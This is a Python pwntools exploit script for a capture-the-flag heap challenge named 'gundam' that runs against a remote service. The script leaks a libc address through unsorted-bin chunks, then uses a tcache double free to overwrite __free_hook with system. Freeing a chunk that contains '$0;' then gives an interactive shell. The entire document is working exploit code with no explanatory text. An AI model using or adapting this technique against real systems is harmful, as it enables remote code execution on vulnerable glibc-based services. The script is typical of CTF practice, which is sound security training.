#! /usr/bin/python

from pwn import *
from LibcSearcher import *

#p = process('./gundam')
p = remote('pwn4fun.com',9091)
elf = ELF('./gundam')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
context.log_level='debug'

def menu(idx):
	p.recvuntil('Your choice : ')
	p.sendline(str(idx))

def build(name,types):
	menu(1)
	p.recvuntil('The name of gundam :')
	p.sendline(name)
	p.recvuntil('The type of the gundam :')
	p.sendline(str(types))

def visit():
	menu(2)

def destory(idx):
	menu(3)
	p.recvuntil('Which gundam do you want to Destory:')
	p.sendline(str(idx))

def blow_up():
	menu(4)

###leak libc###
for i in range(9):
	build('gogogogo',1)#0-8
for i in range(9):
	destory(i)#0-8
blow_up()

for i in range(7):
	build('Tcache',1)#0-6
build('aaaaaaa',1)#7
visit()

p.recvuntil('aaaaaaa')
main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 96
libc_base = main_arena - 0x3ebc40
log.success('libc:'+hex(libc_base))

#gdb.attach(p)
###tcache attack###
malloc_hook = libc_base + libc.symbols['__malloc_hook']
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

destory(1)
destory(0)
destory(0)
blow_up()

build(p64(free_hook),1)#0
build('$0;',1)#0
build(p64(system),1)
###get shell#
destory(0)
p.interactive()